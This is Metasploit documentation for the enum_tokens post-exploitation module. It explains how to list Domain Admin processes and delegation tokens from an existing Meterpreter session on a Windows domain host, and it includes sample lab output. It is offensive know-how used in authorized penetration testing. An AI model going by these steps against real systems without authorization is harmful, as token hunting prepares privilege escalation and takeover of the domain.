## Vulnerable Application

This module enumerates Domain Admin account processes and delegation tokens.

This module will first check if the session has sufficient privileges
to replace process level tokens and adjust process quotas.

The SeAssignPrimaryTokenPrivilege privilege will not be assigned if
the session has been elevated to SYSTEM. In that case try first
migrating to another process that is running as SYSTEM.


## Verification Steps

1. Start msfconsole
1. Get a Meterpreter session on a Windows target on a domain
1. Do: `use post/windows/gather/enum_tokens`
1. Do: `set session [#]`
1. Do: `run`
1. You should receive a list of Domain Admin account processes and delegation tokens


## Options

### GETSYSTEM

Attempt to get SYSTEM privilege on the target host. (default: `true`)


## Scenarios

### Local Administrator session on Windows Server 2008 SP1 (x64)

```
msf6 post(windows/gather/enum_tokens) > set session 1
session => 1
msf6 post(windows/gather/enum_tokens) > set getsystem false
getsystem => false
msf6 post(windows/gather/enum_tokens) > run

[*] Running module against WIN-17B09RRRJTG (192.168.200.218)
[+] Found token for session 1 (192.168.200.218) - Administrator (Delegation Token)
[+] Found process on session 1 (192.168.200.218) - Administrator (PID: 3344) (cmd.exe)
[+] Found process on session 1 (192.168.200.218) - Administrator (PID: 2420) (calc.exe)
[+] Found process on session 1 (192.168.200.218) - Administrator (PID: 2220) (reverse.x64.1337.exe)
[+] Found token for session 1 (192.168.200.218) - corpadmin (Delegation Token)
[+] Found process on session 1 (192.168.200.218) - corpadmin (PID: 1764) (cmd.exe)
[*] Post module execution completed
```
